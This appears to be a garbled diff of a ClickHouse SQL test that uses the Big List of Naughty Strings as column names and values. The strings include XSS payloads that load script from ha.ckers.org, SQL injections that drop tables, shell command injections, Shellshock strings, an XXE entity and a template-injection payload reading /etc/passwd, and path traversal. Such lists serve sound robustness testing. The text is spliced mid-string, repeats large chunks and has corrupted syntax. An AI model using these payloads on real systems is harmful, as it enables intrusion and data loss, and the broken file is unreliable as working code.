+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");                                                                             //<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunt�','{% print \'x\' * 64 * 1024**3 %}','{{ "".__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}' FORMAT PrettyCompactNoEscapes;
+
+SELECT JSONExtract(
+    '{"x": [\n  "", \n  "undefined", \n  "undef", \n  "null", \n  "NULL", \n  "(null)", \n  "nil", \n  "NIL", \n  "true", \n  "false", \n  "True", \n  "False", \n  "TRUE", \n  "FALSE", \n  "None", \n  "hasOwnProperty", \n  "then", \n  "\\\\", \n  "\\\\\\\\", \n  "0", \n  "1", \n  "1.00", \n  "$1.00", \n  "1mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°�ЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้�~��็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็�       ��้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้� end up in your dream, but we hope it works. Please w000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\b','','\t\f              ​    　','­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿','﻿','￾','Ω≈ç√∫˜µ≤≥÷','åß∂ƒ©˙∆˚¬…æ','œ∑´®†¥¨ˆøπ“‘','¡™£¢∞§¶•ªº–≠','¸˛Ç◊ı˜Â¯˘¿','ÅÍÎÏ˝ÓÔÒÚÆ☃','Œ„´‰ˇÁ¨ˆØ∏”’','`⁄€‹›ﬁﬂ‡°·‚—±','⅛⅜⅝⅞','ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя','٠١٢٣٤٥٦٧٨٩','⁰⁴⁵','₀₁₂','⁰⁴⁵₀₁₂','ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็','\'','"','\'\'','""','\'"\'','"\'\'\'\'"\'"','"\'"\'"\'\'\'\'"','<foo val=“bar” />','<foo val=“bar” />','<foo val=”bar“ />','<foo val=`bar\' />','田中さんにあげて下さい','パーティーへ行かないか','和製漢語','部落格','사회과학원 어학연구소','찦차를 타고 온 펲시맨과 쑛다리 똠방각하','社會科學院語學研究所','울란바토르','𠜎𠜱𠝹𠱓𠱸𠲖𠳏','𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖�&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>','<IMG SRC="jav   ascript:alert(\'XSS\');">','<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">','<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">','perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out','<IMG SRC=" &#14;  javascript:alert(\'XSS\');">','<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>','<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>','<<SCRIPT>alert("XSS");//<</SCRIPT>','<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >','<SCRIPT SRC=//ha.ckers.org/.j>','<IMG SRC="javascript:alert(\'XSS\')"','<iframe src=http://ha.ckers.org/scriptlet.html <','\\";alert(\'XSS\');//','<u oncopy=alert()> Copy me</u>','<i onwheel=alert(1)> Scroll over me </i>','<plaintext>','http://a/%%30%30','</textarea><script>alert(123)</script>','1;DROP TABLE users','1\'; DROP TABLE users-- 1','\' OR 1=1 -- 1','\' OR \'1\'=\'1','\'; EXEC sp_MSForEachTable \'DROP TABLE ?\'; --',' ','%','_','-','--','--version','--help','$USER','/dev/null; touch /tmp/blns.fail ; echo','`touch /tmp/blns.fail`','$(touch /tmp/blns.fail)','@{[system "touch /tmp/blns.fail"]}','eval("puts \'hello world\'")','System("ls -al /")','`ls -al /`','Kernel.exec("ls -al /")','Kernel.exit(1)','%x(\'ls -al /\')','<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>','$HOME','$ENV{\'HOME\'}','%d','%s%s%s%s%s','{0}','%*.*s','%@','%n','File:///','../../../../../../../../../../../etc/passwd%00','../../../../../../../../../../../etc/hosts','() { 0; }; touch /tmp/blns.shellshock1.fail;','() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }','<<< %s(un=\'%s\') = %u','+++ATH0','CON','PRN','AUX','CLOCK$','NUL','A:','ZZ:','COM1','LPT1','LPT2','LPT3','COM2','COM3','COM4','DCC SEND STARTKEYLOGGER 0 0 0','Scunthorpe General Hospital','Penistone Community Church','Lightwater Country Park','Jimmy Clitheroe','Horniman Museum','shitake mushrooms','RomansInSussex.co.uk','http://www.cum.qc.ca/','Craig Cockburn, Software Specialist','Linda Callahan','Dr. Herman I. Libshitz','magna دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما , يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو." String,
+  "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ" String,
+  "הָיְתָהtestالصفحات التّحول" String,
+  "﷽" String,
+  "ﷺ" String,
+  "مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ، " String,
+  "᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜‪‪‪" String,
+  "‪‪᚛                 ᚜‪" String,
+  "‪‪test‪" String,
+  "‫test‫" String,
+  " test " String,
+  "test⁠test‫" String,
+  "⁦test⁧" String,
+  "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣" String,
+  "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰" String,
+  "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟" String,
+  "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕" String,
+  "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮" String,
+  "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥" String,
+  "00˙Ɩ$-" String,
+  "Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ" String,
+  "𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠" String,
+  "𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌" String,
+  "𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐�SS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>" String,
+  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>" String,
+  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>" String,
+  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >" String,
+  "<SCRIPT SRC=//ha.ckers.org/.j>" String,
+  "<IMG SRC=\"javascript:alert('XSS')\"" String,
+  "<iframe src=http://ha.ckers.org/scriptlet.html <" String,
+  "\\\";alert('XSS');//" String,
+  "<u oncopy=alert()> Copy me</u>" String,
+  "<i onwheel=alert(1)> Scroll over me </i>" String,/  "<plaintext>" String,
+  "http://a/%%30%30" String,
+  "</textarea><script>alert(123)</script>" String,
+  "1;DROP TABLE users" String,
+  "1'; DROP TABLE users-- 1" String,
+  "' OR 1=1 -- 1" String,
+  "' OR '1'='1" String,
+  "'; EXEC sp_MSForEachTable 'DROP TABLE ?'; --" String,
+  " " String,
+  "%" String,
+  "_" String,
+  "--" String,
+  "--version" String,
+  "--help" String,
+  "$USER" String,
+  "/dev/null; touch /tmp/blns.fail ; echo" String,
+  "`touch /tmp/blns.fail`" String,
+  "$(touch /tmp/blns.fail)" String,
+  "@{[system \"touch /tmp/blns.fail\"]}" String,
+  "eval(\"puts 'hello world'\")" String,
+  "System(\"ls -al /\")" String,
+  "`ls -al /`" String,
+  "Kernel.exec(\"ls -al /\")" String,
+  "Kernel.exit(1)" String,
+  "%x('ls -al /')" String,
+  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>" String,
+  "$HOME" String,
+  "$ENV{'HOME'}" String,
+  "%d" String,
+  "%s%s%s%s%s" String,
+  "{0}" String,
+  "%*.*s" String,
+  "%@" String,
+  "%n" String,
+  "File:///" String,
+  "../../../../../../../../../../../etc/passwd%00" String,
+  "../../../../../../../../../../../etc/hosts" String,
+  "() { 0; }; touch /tmp/blns.shellshock1.fail;" String,
+  "() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }" String,
+  "<<< %s(un='%s') = %u" String,
+  "+++ATH0" String,
+  "CON" Strin`````````````````````````````````````````````````````````````````````````````````````````````````````````g,
+  "PRN" String,
+  "AUX" String,
+  "CLOCK$" String,
+  "NUL" String,
+  "A:" String,
+  "ZZ:" String,
+  "COM1" String,
+  "LPT1" String,
+  "LPT2" String,
+  "LPT3" String,
+  "COM2" String,
+  "COM3" String,
+  "COM4" String,
+  "DCC SEND STARTKEYLOGGER 0 0 0" String,
+  "Scunthorpe General Hospital" String,
+  "Penistone Community Church" String,
+  "Lightwater Country Park" String,
+  "Jimmy Clitheroe" String,
+  "Horniman Museum" String,
+  "shitake mushrooms" String,
+  "RomansInSussex.co.uk" String,
+  "http://www.cum.qc.ca/" String,
+  "Craig Cockburn, Software Specialist" String,
+  "Linda Callahan" String,
+  "Dr. Herman I. Libshitz" String,
+  "magna cum laude" String,
+  "Super Bowl XXX" String,
+  "medieval erection of parapets" String,
+  "evaluate" String,
+  "mocha" String,
+  "expression" String,
+  "Arsenal canal" String,
+  "classic" String,
+  "Tyson Gay" String,
+  "Dick Van Dyke" String,
+  "basement" String,
+  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you." String,
+  "Roses are \u001b[0;31mred\u001b[0m, violets are \u001b[0;34mblue. Hope you enjoy terminal hue" String,
+  "But now...\u001b[20Cfor my greatest trick...\u001b[8m" String,
+  "The quic\b\b\b\b\b\bk brown fo\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007\u0007x... [Beeeep]" String,
+  "Powerلُلُصّبُلُلصّبُررً ॣ ॣh ॣ ॣ冗" String,
+  "🏳0🌈️" String,
+  "జ్ఞ‌ా" String,
+  "گچپژ" String,
+  "{% print 'x' * 64 * 1024**3 %}" String,
+  "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" String
+) ENGINE = MergeTree ORDER BY "{{ \"\".__class__.__mro__[2].__subclasses__()[40](\"/etc/passwd\").read() }}" SETTINGS min_bytes_for_wide_part = '100G';
+
+INSERT INTO test ("0") SELECT 'Hello, world!';
+SELECT count() FROM test;
+
+DETACH TABLE test;
+ATTACH TABLE test;
+
+SELECT count() FROM test;
+
+INSERT INTO test ("0") VALUES ('Hello, world!');
+SELECT count() FROM test;
+
+DROP TABLE IF EXISTS test_r1;
+DROP TABLE IF EXISTS test_r2;
+
+CREATE TABLE test_r1 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r1') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+INSERT INTO test_r1 SELECT * FROM test;
+CREATE TABLE test_r2 AS test ENGINE = ReplicatedMergeTree('/clickhouse/{database}/test_01666', 'r2') ORDER BY "\\" SETTINGS min_bytes_for_wide_part = '100G';
+
+SYSTEM SYNC REPLICA test_r2;
+
+SELECT count() FROM test_r1;
+SELECT count() FROM test_r2;
+
+DROP TABLE test_r1;
+DROP TABLE test_r2;
+
+SELECT groupArray(name) FROM system.columns WHERE database = currentDatabase() AND table = 'test';
+
+DROP TABLE test;
+
+SELECT 'undefined','undef','null','NULL','(null)','nil','NIL','true','false','True','False','TRUE','FALSE','None','hasOwnProperty','then','\\','\\\\','0','1','1.00','$1.00','1/2','1E2','1E02','1E+02','-1','-1.00','-$1.00','-1/2','-1E2','-1E02','-1E+02','1/0','0/0','-2147483648/-1','-9223372036854775808/-1','-0','-0.0','+0','+0.0','0.00','0..0','.','0.0.0','0,00','0,,0',',','0,0,0','0.0/0','1.0/0.0','0.0/0.0','1,0/0,0','0,0/0,0','--1','-','-.','-,','999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999','NaN','Infinity','-Infinity','INF','1#INF','-1#IND','1#QNAN','1#SNAN','1#IND','0x0','0xffffffff','0xff����ffffffffff','0xabad1dea','123456789012345678901234567890123456789','1,000.00','1 000.00','1\'000.00','1,000,000.00','1 000 000.00','1\'000\'000.00','1.000,00','1 000,00','1\'000,00','1.000.000,00','1 000 000,00','1\'000\'000,00','01000','08','09','2.2250738585072011e-308',',./;\'[]\\-=','<>?:"{}|_+','!@#$%^&*()`~','\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\b\\u000e\\u000f\\u0010\\u0011\\u0012\\u0013\\u0014\\u0015\\u0016\\u0017\\u0018\\u0019\\u001a\\u001b\\u001c\\u001d\\u001e\\u001f','','\t\\u000b\f              ​    　